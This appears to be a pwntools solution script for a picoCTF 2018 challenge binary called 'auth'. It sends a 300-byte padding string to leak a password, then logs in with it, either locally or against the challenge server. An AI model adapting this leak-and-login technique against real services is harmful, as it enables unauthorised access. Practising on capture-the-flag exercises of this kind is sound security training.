#!/usr/bin/env python2
from pwn import *
import os
import commands
import re

# Payload settings
vuln = ELF('./auth')
padding = 'A' * 300
payload = padding

# Run local
def local():
	io = vuln.process()
	io.sendline(payload)
	pwd = io.recv()
	password = re.findall(r'A+,(.+)', pwd)[0].strip()
	io.close()
	io = vuln.process()
	io.recvuntil('What is your name?')
	io.sendline('hacker')
	io.recvuntil('Please Enter the Password.')
	io.sendline(password)
	print(io.recv())
	print(io.recv())
	io.close()

def connect():
	io = remote('2018shell1.picoctf.com', 57659)
	io.recv()
	io.sendline(payload)
	io.recv()
	pwd = io.recv()
	password = re.findall(r'A+,(.+)', pwd)[0].strip()
	io.close()
	
	io = remote('2018shell1.picoctf.com', 57659)
	io.recvuntil('What is your name?')
	io.sendline('hacker')
	io.recvuntil('Please Enter the Password.')
	io.sendline(password)
	print(io.recv())
	print(io.recv())
	io.close()

if __name__ == '__main__':
	connect()